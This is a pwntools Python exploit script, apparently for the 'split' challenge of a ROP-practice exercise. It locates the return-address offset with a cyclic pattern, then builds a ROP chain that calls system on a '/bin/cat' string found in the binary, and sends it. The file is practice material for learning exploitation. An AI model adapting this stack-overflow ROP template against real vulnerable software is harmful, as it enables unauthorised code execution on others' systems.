#!/usr/bin/python3
from pwn import *
import sys
context.log_level = 'DEBUG'
context(os='linux', arch='amd64')
exe = './split'
e = context.binary = ELF(exe, checksec=False)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = e.debug(gdbscript='''
source /home/nick/global/halfdisp.py
break *pwnme+72
c
'''
)
def find_ip(payload):
    p = process(exe)
    p.sendlineafter(b">", payload)
    p.wait()
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    warn('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

offset = find_ip(cyclic(200))
rop = ROP(e)

rop.system(next(libc.search(b'/bin/sh\x00')))
system = e.symbols['system']
bincat=next(e.search(b'/bin/cat'))
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

info("poprdi: %#x:",pop_rdi)

payload=flat([
    offset*b"\x90",
    p64(ret),
    p64(pop_rdi),
    bincat,
    e.symbols.system
])

p.sendlineafter("data...",payload)
p.interactive()